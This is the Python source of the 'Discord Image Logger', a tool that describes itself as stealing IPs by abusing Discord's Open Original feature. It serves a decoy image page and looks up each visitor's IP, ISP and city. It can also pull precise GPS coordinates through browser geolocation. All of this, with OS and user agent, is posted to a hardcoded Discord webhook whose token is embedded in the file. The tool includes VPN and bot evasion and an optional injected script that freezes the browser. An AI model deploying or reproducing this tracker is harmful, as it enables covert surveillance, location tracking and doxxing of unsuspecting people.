# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1435160432934649882/v0u-3jWpgmo8jr2BmIpx-FvWQ0o5pPsKuDoHPQ1RswZ_uQEiPHv5H9EZiGe7xSsJBCvX",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
